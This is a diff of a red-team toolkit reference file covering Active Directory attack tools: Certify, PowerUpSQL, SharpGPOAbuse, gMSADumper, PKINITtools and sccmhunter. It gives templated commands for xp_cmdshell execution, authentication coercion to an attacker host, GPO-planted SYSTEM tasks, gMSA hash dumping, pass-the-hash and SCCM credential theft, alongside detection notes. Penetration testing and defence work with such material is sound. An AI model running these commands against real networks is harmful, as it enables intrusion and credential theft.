+              "Certify 2.0 reworked the CLI (e.g. find --json); verify the exact syntax against your build.",
+              "The issued PEM is converted to a PFX, then used with Rubeus (asktgt /ptt) to turn the cert into a TGT. Certipy is the Python/Linux equivalent that does request+auth in one step."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Certify — GitHub (GhostPack)",
+                "url": "https://github.com/GhostPack/Certify"
+              },
+              {
+                "label": "Vulns — AD CS ESC misconfigurations",
+                "url": "vulns.html"
+              },
+              {
+                "label": "Theory — Active Directory Certificate Services",
+                "url": "theory/2026-08-18-adcs.html"
+              }
             ]
           }
         ]
       },
       {
-        id: "powerupsql",
-        name: "PowerUpSQL / SharpSQL",
-        url: "https://github.com/NetSPI/PowerUpSQL",
-        description: "Toolkits for discovering, auditing and attacking MS SQL Servers in an AD environment, including database-link crawling to xp_cmdshell.",
-        brief: "PowerUpSQL is NetSPI's PowerShell toolkit for finding and attacking SQL Servers across a domain — instance discovery via SPNs, privilege and role checks, linked-server enumeration, and crawling chains of database links to reach a server where the attacker is sysadmin and run OS commands with xp_cmdshell. SharpSQL is a C# implementation covering most of the same modules (Get-SQLInstanceDomain, Invoke-SQLAudit, Get-SQLServerLinkCrawl) for in-memory use; where SharpSQL lacks the link-crawl module, PowerUpSQL is compiled to an EXE (PS2EXE) so it can run through execute-assembly too.",
-        quickReference: [
-          { label: "Find domain SQL instances", cmd: "Get-SQLInstanceDomain" },
-          { label: "Check privileges on an instance", cmd: "Invoke-SQLAudit -Instance <sql>   |   Get-SQLServerLinkCrawl -Instance <sql>" },
-          { label: "OS command via link crawl", cmd: "Get-SQLServerLinkCrawl -Instance <sql> -Query \"exec master..xp_cmdshell 'whoami'\"" }
-        ],
-        sections: [
+        "id": "powerupsql",
+        "name": "PowerUpSQL / SharpSQL",
+        "url": "https://github.com/NetSPI/PowerUpSQL",
+        "description": "Toolkits for discovering, auditing and attacking MS SQL Servers in an AD environment, including database-link crawling to xp_cmdshell.",
+        "brief": "PowerUpSQL is NetSPI's PowerShell toolkit for finding and attacking SQL Servers across a domain — instance discovery via SPNs, privilege and role checks, linked-server enumeration, and crawling chains of database links to reach a server where the attacker is sysadmin and run OS commands with xp_cmdshell. SharpSQL is a C# implementation covering most of the same modules (Get-SQLInstanceDomain, Invoke-SQLAudit, Get-SQLServerLinkCrawl) for in-memory use; where SharpSQL lacks the link-crawl module, PowerUpSQL is compiled to an EXE (PS2EXE) so it can run through execute-assembly too.",
+        "quickReference": [
           {
-            title: "Enumeration & Link Abuse",
-            type: "commands",
-            commands: [
-              { label: "SharpSQL — in-memory enumeration", cmd: "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Invoke-SQLAudit -Instance <sql-instance>'\n'/path/SharpSQL.exe' 'Get-SQLServerLinkCrawl -Instance <sql-instance>'" },
-              { label: "PowerUpSQL — crawl links and run OS commands", cmd: "# compile PowerUpSQL (with a Get-SQLServerLinkCrawl call) to EXE via PS2EXE, then:\nGet-SQLServerLinkCrawl -Instance <sql-instance> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <linked-sql>" }
+            "label": "Find domain SQL instances",
+            "cmd": "Get-SQLInstanceDomain"
+          },
+          {
+            "label": "Check privileges on an instance",
+            "cmd": "Invoke-SQLAudit -Instance <sql>   |   Get-SQLServerLinkCrawl -Instance <sql>"
+          },
+          {
+            "label": "OS command via link crawl",
+            "cmd": "Get-SQLServerLinkCrawl -Instance <sql> -Query \"exec master..xp_cmdshell 'whoami'\""
+          }
+        ],
+        "sections": [
+          {
+            "title": "Enumeration & Link Abuse",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "SharpSQL — in-memory enumeration",
+                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Invoke-SQLAudit -Instance <sql-instance>'\n'/path/SharpSQL.exe' 'Get-SQLServerLinkCrawl -Instance <sql-instance>'"
+              },
+              {
+                "label": "PowerUpSQL — crawl links and run OS commands",
+                "cmd": "# compile PowerUpSQL (with a Get-SQLServerLinkCrawl call) to EXE via PS2EXE, then:\nGet-SQLServerLinkCrawl -Instance <sql-instance> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <linked-sql>"
+              }
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "PowerUpSQL — GitHub (NetSPI)", url: "https://github.com/NetSPI/PowerUpSQL" },
-              { label: "Vulns — SQL Server Links", url: "vulns.html" }
+            "title": "Key cmdlets",
+            "type": "table",
+            "columns": [
+              "Cmdlet",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "Get-SQLInstanceDomain",
+                "Find SQL instances in the domain via their SPNs"
+              ],
+              [
+                "Get-SQLInstanceScanUDP",
+                "Discover instances by UDP broadcast"
+              ],
+              [
+                "Get-SQLConnectionTestThreaded",
+                "Which discovered instances you can actually log into"
+              ],
+              [
+                "Invoke-SQLAudit",
+                "Run all built-in privilege / misconfiguration checks"
+              ],
+              [
+                "Get-SQLServerLinkCrawl",
+                "Crawl linked-server chains (openquery) across trust"
+              ],
+              [
+                "Get-SQLServerLoginDefaultPw",
+                "Test well-known default sa / appliance passwords"
+              ],
+              [
+                "Invoke-SQLOSCmd",
+                "Run OS commands (xp_cmdshell) where you are sysadmin"
+              ],
+              [
+                "Get-SQLColumnSampleDataThreaded -Keyword \"password,ssn\"",
+                "Hunt sensitive data across databases"
+              ],
+              [
+                "Get-SQLServerPriv / Invoke-SQLImpersonateService",
+                "Enumerate/abuse IMPERSONATE and TRUSTWORTHY for privesc"
+              ]
+            ]
+          },
+          {
+            "title": "Notes & Tips",
+            "type": "notes",
+            "items": [
+              "A SQL login is not required on every hop: Get-SQLServerLinkCrawl reaches a server where the chained service account is sysadmin, giving xp_cmdshell without creds on that box.",
+              "Coerce auth to capture/relay: xp_dirtree / xp_fileexist against \\\\<attacker>\\x makes the SQL service account authenticate to you — pair with Responder or ntlmrelayx.",
+              "SharpSQL (C#) covers most modules in memory; for the link-crawl, compile PowerUpSQL with PS2EXE and run it via execute-assembly."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "PowerUpSQL — GitHub (NetSPI)",
+                "url": "https://github.com/NetSPI/PowerUpSQL"
+              },
+              {
+                "label": "Vulns — SQL Server Links",
+                "url": "vulns.html"
+              }
             ]
           }
         ]
@@ -2785,190 +3241,300 @@ var TOOLKIT = [
               ]
       },
       {
-              "id": "sharpgpoabuse",
-              "name": "SharpGPOAbuse",
-              "url": "https://github.com/ReversecLabs/SharpGPOAbuse",
-              "description": "Turns write access over a GPO into code execution / local admin on every machine in its scope.",
-              "brief": "SharpGPOAbuse abuses a writable Group Policy Object. If you can edit a GPO (WriteProperty/WriteDacl on the GPC, a common ACL finding), you control policy for every computer or user the GPO is linked to. SharpGPOAbuse writes the malicious policy — an immediate scheduled task, a startup script, or a new local-admin membership — that the targeted machines apply at the next policy refresh.\n\nIt is a mass code-execution primitive: one writable GPO linked to a busy OU can mean SYSTEM on dozens of hosts. The changes bump the GPO version and add scheduled-task or registry policy items, which are auditable, so it is powerful but not subtle.",
-              "quickReference": [
-                      {
-                              "label": "Add an immediate task (SYSTEM)",
-                              "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'update' --Author <domain>\\<user> --Command 'cmd.exe' --Arguments '/c <payload>' --GPOName '<GPO>'"
-                      },
-                      {
-                              "label": "Add yourself as local admin",
-                              "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName '<GPO>'"
-                      },
-                      {
-                              "label": "User logon task",
-                              "cmd": "SharpGPOAbuse.exe --AddUserTask --TaskName 'x' --Author <a> --Command 'cmd' --Arguments '/c <payload>' --GPOName '<GPO>'"
-                      }
+        "id": "sharpgpoabuse",
+        "name": "SharpGPOAbuse",
+        "url": "https://github.com/ReversecLabs/SharpGPOAbuse",
+        "description": "Turns write access over a GPO into code execution / local admin on every machine in its scope.",
+        "brief": "SharpGPOAbuse abuses a writable Group Policy Object. If you can edit a GPO (WriteProperty/WriteDacl on the GPC, a common ACL finding), you control policy for every computer or user the GPO is linked to. SharpGPOAbuse writes the malicious policy — an immediate scheduled task, a startup script, or a new local-admin membership — that the targeted machines apply at the next policy refresh.\n\nIt is a mass code-execution primitive: one writable GPO linked to a busy OU can mean SYSTEM on dozens of hosts. The changes bump the GPO version and add scheduled-task or registry policy items, which are auditable, so it is powerful but not subtle.",
+        "quickReference": [
+          {
+            "label": "Add an immediate task (SYSTEM)",
+            "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'update' --Author <domain>\\<user> --Command 'cmd.exe' --Arguments '/c <payload>' --GPOName '<GPO>'"
+          },
+          {
+            "label": "Add yourself as local admin",
+            "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName '<GPO>'"
+          },
+          {
+            "label": "User logon task",
+            "cmd": "SharpGPOAbuse.exe --AddUserTask --TaskName 'x' --Author <a> --Command 'cmd' --Arguments '/c <payload>' --GPOName '<GPO>'"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Key flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "--AddComputerTask",
+                "Add an immediate scheduled task that runs as SYSTEM on scoped computers"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Computer immediate task → SYSTEM on scoped hosts",
-                                              "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<domain>\\<user>' --Command 'powershell.exe' --Arguments '-enc <b64>' --GPOName '<Vulnerable GPO>'"
-                                      },
-                                      {
-                                              "label": "Grant local admin across the OU",
-                                              "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<you>' --GPOName '<Vulnerable GPO>'"
-                                      },
-                                      {
-                                              "label": "Force a refresh (or wait ~90 min)",
-                                              "cmd": "# on a host you already control: gpupdate /force"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Bumps the GPO version (GPT.ini) and drops scheduled-task/registry policy — 5136 on the GPC and new tasks are the signal.",
-                                      "Prefer removing the change after execution; a lingering immediate task re-runs and is easy to spot.",
-                                      "pyGPOAbuse is the Linux equivalent when you only have creds and no Windows foothold."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "SharpGPOAbuse — GitHub",
-                                              "url": "https://github.com/ReversecLabs/SharpGPOAbuse"
-                                      },
-                                      {
-                                              "label": "Theory — Group Policy (GPO)",
-                                              "url": "theory/2026-08-18-group-policy.html"
-                                      }
-                              ]
-                      }
+              [
+                "--AddUserTask",
+                "Add a scheduled task that runs in a scoped user's context"
+              ],
+              [
+                "--AddLocalAdmin",
+                "Add an account to local Administrators on scoped hosts"
+              ],
+              [
+                "--AddUserRights",
+                "Grant user rights (e.g. SeDebugPrivilege, SeTakeOwnershipPrivilege) via GPO"
+              ],
+              [
+                "--TaskName <n> / --Author <DOM\\user>",
+                "Identity of the planted task (make it look legitimate)"
+              ],
+              [
+                "--Command <bin> / --Arguments <args>",
+                "What the task executes"
+              ],
+              [
+                "--UserAccount <user>",
+                "Account for --AddLocalAdmin / --AddUserRights"
+              ],
+              [
+                "--GPOName \"<name>\" / --GPOId <guid>",
+                "The writable GPO to weaponise"
+              ],
+              [
+                "--Force",
+                "Apply even when the GPO is not currently linked"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Computer immediate task → SYSTEM on scoped hosts",
+                "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<domain>\\<user>' --Command 'powershell.exe' --Arguments '-enc <b64>' --GPOName '<Vulnerable GPO>'"
+              },
+              {
+                "label": "Grant local admin across the OU",
+                "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<you>' --GPOName '<Vulnerable GPO>'"
+              },
+              {
+                "label": "Force a refresh (or wait ~90 min)",
+                "cmd": "# on a host you already control: gpupdate /force"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Bumps the GPO version (GPT.ini) and drops scheduled-task/registry policy — 5136 on the GPC and new tasks are the signal.",
+              "Prefer removing the change after execution; a lingering immediate task re-runs and is easy to spot.",
+              "pyGPOAbuse is the Linux equivalent when you only have creds and no Windows foothold."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "SharpGPOAbuse — GitHub",
+                "url": "https://github.com/ReversecLabs/SharpGPOAbuse"
+              },
+              {
+                "label": "Theory — Group Policy (GPO)",
+                "url": "theory/2026-08-18-group-policy.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "gmsadumper",
-              "name": "gMSADumper",
-              "url": "https://github.com/micahvandeusen/gMSADumper",
-              "description": "Recovers group-Managed Service Account passwords over LDAP for principals allowed to read them.",
-              "brief": "gMSADumper retrieves the password blob of a group-Managed Service Account (gMSA). A gMSA's password is managed by AD and readable only by the principals listed in its msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) attribute. If you control one of those principals, gMSADumper reads the msDS-ManagedPassword blob and derives the account's NT hash.\n\nBecause gMSAs frequently run privileged services, recovering one often yields a high-value credential you can use for pass-the-hash or to Kerberoast dependent SPNs. The read is a normal LDAP query, but access to msDS-ManagedPassword by an unexpected principal is auditable.",
-              "quickReference": [
-                      {
-                              "label": "Dump gMSA passwords",
-                              "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain>"
-                      },
-                      {
-                              "label": "With a hash",
-                              "cmd": "nxc ldap <dc_ip> -u <user> -H <nthash> --gmsa"
-                      },
-                      {
-                              "label": "Via NetExec",
-                              "cmd": "nxc ldap <dc_ip> -u <user> -p '<pass>' --gmsa"
-                      }
+        "id": "gmsadumper",
+        "name": "gMSADumper",
+        "url": "https://github.com/micahvandeusen/gMSADumper",
+        "description": "Recovers group-Managed Service Account passwords over LDAP for principals allowed to read them.",
+        "brief": "gMSADumper retrieves the password blob of a group-Managed Service Account (gMSA). A gMSA's password is managed by AD and readable only by the principals listed in its msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) attribute. If you control one of those principals, gMSADumper reads the msDS-ManagedPassword blob and derives the account's NT hash.\n\nBecause gMSAs frequently run privileged services, recovering one often yields a high-value credential you can use for pass-the-hash or to Kerberoast dependent SPNs. The read is a normal LDAP query, but access to msDS-ManagedPassword by an unexpected principal is auditable.",
+        "quickReference": [
+          {
+            "label": "Dump gMSA passwords",
+            "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain>"
+          },
+          {
+            "label": "With a hash",
+            "cmd": "nxc ldap <dc_ip> -u <user> -H <nthash> --gmsa"
+          },
+          {
+            "label": "Via NetExec",
+            "cmd": "nxc ldap <dc_ip> -u <user> -p '<pass>' --gmsa"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Ways to read a gMSA password",
+            "type": "table",
+            "columns": [
+              "Method",
+              "Command"
+            ],
+            "rows": [
+              [
+                "gMSADumper.py",
+                "gMSADumper.py -u <user> -p <pass> -d <domain> [-l <dc>]"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Retrieve the managed password / NT hash",
-                                              "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain> -l <dc_ip>"
-                                      },
-                                      {
-                                              "label": "Use the recovered hash",
-                                              "cmd": "nxc smb <target> -u '<gmsa$>' -H <nthash>"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Only members of msDS-GroupMSAMembership can read the blob — audit that list and 4662 reads of msDS-ManagedPassword.",
-                                      "A gMSA is only as safe as the principals allowed to read it; a compromised low-priv member exposes the service account."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "gMSADumper — GitHub",
-                                              "url": "https://github.com/micahvandeusen/gMSADumper"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Credential Storage",
-                                              "url": "theory/2026-08-18-windows-credential-storage.html"
-                                      }
-                              ]
-                      }
+              [
+                "NetExec",
+                "nxc ldap <dc> -u <user> -p <pass> --gmsa"
+              ],
+              [
+                "bloodyAD",
+                "bloodyAD -u <user> -p <pass> -d <domain> --host <dc> get object <gmsa$> --attr msDS-ManagedPassword"
+              ],
+              [
+                "DSInternals (Windows)",
+                "Get-ADServiceAccount <gmsa> -Properties msDS-ManagedPassword | ConvertFrom-ADManagedPasswordBlob"
+              ],
+              [
+                "Then reuse",
+                "Pass-the-Hash with the NT hash, or Kerberoast the gMSA's dependent SPNs"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Retrieve the managed password / NT hash",
+                "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain> -l <dc_ip>"
+              },
+              {
+                "label": "Use the recovered hash",
+                "cmd": "nxc smb <target> -u '<gmsa$>' -H <nthash>"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Only members of msDS-GroupMSAMembership can read the blob — audit that list and 4662 reads of msDS-ManagedPassword.",
+              "A gMSA is only as safe as the principals allowed to read it; a compromised low-priv member exposes the service account."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "gMSADumper — GitHub",
+                "url": "https://github.com/micahvandeusen/gMSADumper"
+              },
+              {
+                "label": "Theory — Windows Credential Storage",
+                "url": "theory/2026-08-18-windows-credential-storage.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "gettgtpkinit",
-              "name": "gettgtpkinit",
-              "url": "https://github.com/dirkjanm/PKINITtools",
-              "description": "Requests a Kerberos TGT using a certificate (PKINIT) — the bridge from a cert to a ticket.",
-              "brief": "gettgtpkinit (from PKINITtools) performs the PKINIT exchange: it presents a certificate and its private key to the KDC and receives a Kerberos TGT for the certificate's identity. It is the Linux tool that turns any client-authentication certificate — from AD CS abuse (ESC1 etc.) or a Shadow Credential — into a usable ticket.\n\nIt pairs with getnthash (also in PKINITtools) to perform UnPAC-the-hash: once you hold the PKINIT TGT and its session key, you can recover the account's NT hash from the ticket's PAC_CREDENTIAL_INFO, unifying the certificate and hash worlds.",
-              "quickReference": [
-                      {
-                              "label": "Cert → TGT",
-                              "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass <pfx_pass> <domain>/<user> user.ccache"
-                      },
-                      {
-                              "label": "Use the ticket",
-                              "cmd": "export KRB5CCNAME=user.ccache ; nxc smb <target> -k --use-kcache"
-                      },
-                      {
-                              "label": "UnPAC the hash",
-                              "cmd": "getnthash.py -key <AS-REP-key> <domain>/<user>"
-                      }
+        "id": "gettgtpkinit",
+        "name": "gettgtpkinit",
+        "url": "https://github.com/dirkjanm/PKINITtools",
+        "description": "Requests a Kerberos TGT using a certificate (PKINIT) — the bridge from a cert to a ticket.",
+        "brief": "gettgtpkinit (from PKINITtools) performs the PKINIT exchange: it presents a certificate and its private key to the KDC and receives a Kerberos TGT for the certificate's identity. It is the Linux tool that turns any client-authentication certificate — from AD CS abuse (ESC1 etc.) or a Shadow Credential — into a usable ticket.\n\nIt pairs with getnthash (also in PKINITtools) to perform UnPAC-the-hash: once you hold the PKINIT TGT and its session key, you can recover the account's NT hash from the ticket's PAC_CREDENTIAL_INFO, unifying the certificate and hash worlds.",
+        "quickReference": [
+          {
+            "label": "Cert → TGT",
+            "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass <pfx_pass> <domain>/<user> user.ccache"
+          },
+          {
+            "label": "Use the ticket",
+            "cmd": "export KRB5CCNAME=user.ccache ; nxc smb <target> -k --use-kcache"
+          },
+          {
+            "label": "UnPAC the hash",
+            "cmd": "getnthash.py -key <AS-REP-key> <domain>/<user>"
+          }
+        ],
+        "sections": [
+          {
+            "title": "PKINITtools scripts & flags",
+            "type": "table",
+            "columns": [
+              "Item",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "gettgtpkinit.py",
+                "Certificate (PFX) -> Kerberos TGT; prints the AS-REP encryption key"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Obtain a TGT from a certificate",
-                                              "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass '<pfx_pass>' <domain>/<user> user.ccache\n# prints the AS-REP encryption key you need for UnPAC-the-hash"
-                                      },
-                                      {
-                                              "label": "Recover the NT hash (UnPAC)",
-                                              "cmd": "getnthash.py -key '<as_rep_key>' <domain>/<user>\n# certipy auth -pfx <user>.pfx also does cert->TGT and prints the hash in one step"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Needs a PKINIT-capable KDC (a DC/KDC certificate). PKINIT AS-REQ (4768 with certificate info) from an odd host is the signal.",
-                                      "This is the mechanism behind Shadow Credentials and AD CS abuse — read the Shadow Credentials / PKINIT theory page."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "PKINITtools — GitHub (dirkjanm)",
-                                              "url": "https://github.com/dirkjanm/PKINITtools"
-                                      },
-                                      {
-                                              "label": "Theory — Shadow Credentials, PKINIT & UnPAC",
-                                              "url": "theory/2026-09-24-shadow-credentials-pkinit.html"
-                                      },
-                                      {
-                                              "label": "Theory — AD Certificate Services",
-                                              "url": "theory/2026-08-18-adcs.html"
-                                      }
-                              ]
-                      }
+              [
+                "getnthash.py",
+                "TGT + AS-REP key -> the account's NT hash (UnPAC-the-hash)"
+              ],
+              [
+                "gets4uticket.py",
+                "Use the PKINIT TGT for an S4U (impersonation) ticket"
+              ],
+              [
+                "-cert-pfx <f> / -pfx-pass <p> / -pfx-base64 <b64>",
+                "Certificate input (file or base64)"
+              ],
+              [
+                "-dc-ip <ip> / -v",
+                "Target KDC / verbose output"
+              ],
+              [
+                "All-in-one alternative",
+                "certipy auth -pfx <f> does cert->TGT and prints the NT hash in one step"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Obtain a TGT from a certificate",
+                "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass '<pfx_pass>' <domain>/<user> user.ccache\n# prints the AS-REP encryption key you need for UnPAC-the-hash"
+              },
+              {
+                "label": "Recover the NT hash (UnPAC)",
+                "cmd": "getnthash.py -key '<as_rep_key>' <domain>/<user>\n# certipy auth -pfx <user>.pfx also does cert->TGT and prints the hash in one step"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Needs a PKINIT-capable KDC (a DC/KDC certificate). PKINIT AS-REQ (4768 with certificate info) from an odd host is the signal.",
+              "This is the mechanism behind Shadow Credentials and AD CS abuse — read the Shadow Credentials / PKINIT theory page."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "PKINITtools — GitHub (dirkjanm)",
+                "url": "https://github.com/dirkjanm/PKINITtools"
+              },
+              {
+                "label": "Theory — Shadow Credentials, PKINIT & UnPAC",
+                "url": "theory/2026-09-24-shadow-credentials-pkinit.html"
+              },
+              {
+                "label": "Theory — AD Certificate Services",
+                "url": "theory/2026-08-18-adcs.html"
+              }
+            ]
+          }
+        ]
       },
       {
               "id": "sharpsccm",
@@ -3060,62 +3626,100 @@ var TOOLKIT = [
               ]
       },
       {
-              "id": "sccmhunter",
-              "name": "sccmhunter",
-              "url": "https://github.com/garrettfoster13/sccmhunter",
-              "description": "Python SCCM recon and attack toolkit — find the hierarchy, request policies and relay from Linux.",
-              "brief": "sccmhunter is a Python toolkit for profiling and attacking SCCM/MECM from Linux. Its 'find' module locates management points, distribution points and site codes via LDAP and HTTP; its 'http' module registers a device and requests policies (including the NAA); and it supports the coercion/relay paths to take over a site — all without needing a Windows host.\n\nIt complements SharpSCCM (the C# tool) and is the go-to when you are operating from a Linux box with only domain credentials. The SCCM/MECM Abuse theory page ties the modules to the overall attack.",
-              "quickReference": [
-                      {
-                              "label": "Find the hierarchy",
-                              "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>"
-                      },
-                      {
-                              "label": "Request policies (NAA)",
-                              "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> ..."
-                      },
-                      {
-                              "label": "Show findings",
-                              "cmd": "sccmhunter.py show -all"
-                      }
+        "id": "sccmhunter",
+        "name": "sccmhunter",
+        "url": "https://github.com/garrettfoster13/sccmhunter",
+        "description": "Python SCCM recon and attack toolkit — find the hierarchy, request policies and relay from Linux.",
+        "brief": "sccmhunter is a Python toolkit for profiling and attacking SCCM/MECM from Linux. Its 'find' module locates management points, distribution points and site codes via LDAP and HTTP; its 'http' module registers a device and requests policies (including the NAA); and it supports the coercion/relay paths to take over a site — all without needing a Windows host.\n\nIt complements SharpSCCM (the C# tool) and is the go-to when you are operating from a Linux box with only domain credentials. The SCCM/MECM Abuse theory page ties the modules to the overall attack.",
+        "quickReference": [
+          {
+            "label": "Find the hierarchy",
+            "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>"
+          },
+          {
+            "label": "Request policies (NAA)",
+            "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> ..."
+          },
+          {
+            "label": "Show findings",
+            "cmd": "sccmhunter.py show -all"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Modules",
+            "type": "table",
+            "columns": [
+              "Module",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "find",
+                "LDAP recon: management points, distribution points, site systems and site codes"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Profile the environment",
-                                              "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>\nsccmhunter.py show -all"
-                                      },
-                                      {
-                                              "label": "Register a device and pull secrets",
-                                              "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> ...   # request NAA policy"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Same signals as SharpSCCM — device registration + policy requests, admin changes. Defence: Enhanced HTTP, no NAA, Tier-0 site systems."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "sccmhunter — GitHub (garrettfoster13)",
-                                              "url": "https://github.com/garrettfoster13/sccmhunter"
-                                      },
-                                      {
-                                              "label": "Theory — SCCM / MECM Abuse",
-                                              "url": "theory/2026-09-24-sccm-mecm-abuse.html"
-                                      }
-                              ]
-                      }
+              [
+                "smb",
+                "Profile discovered hosts (SMB / HTTP / MSSQL); hunt PXE and NAA variable files"
+              ],
+              [
+                "http",
+                "Register a device, request policies, and recover the Network Access Account (client-push) credential"
+              ],
+              [
+                "admin",
+                "Interactive shell to the SMS Provider AdminService (add_admin, get_creds)"
+              ],
+              [
+                "dpapi",
+                "Decrypt secrets from a compromised client (after recovering the NAA)"
+              ],
+              [
+                "show",
+                "Display / export results stored in the local DB (show -all)"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Profile the environment",
+                "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>\nsccmhunter.py smb  -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>\nsccmhunter.py show -all"
+              },
+              {
+                "label": "Recover the Network Access Account (client push)",
+                "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> -target <mp.fqdn>"
+              },
+              {
+                "label": "Site takeover via the AdminService",
+                "cmd": "sccmhunter.py admin -u <user> -p '<pass>' -ip <smsprovider>\n# in the shell: get_creds ; add_admin <user> <sid>"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Same signals as SharpSCCM — device registration + policy requests, admin changes. Defence: Enhanced HTTP, no NAA, Tier-0 site systems."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "sccmhunter — GitHub (garrettfoster13)",
+                "url": "https://github.com/garrettfoster13/sccmhunter"
+              },
+              {
+                "label": "Theory — SCCM / MECM Abuse",
+                "url": "theory/2026-09-24-sccm-mecm-abuse.html"
+              }
+            ]
+          }
+        ]
       },
       {
               "id": "aadinternals",
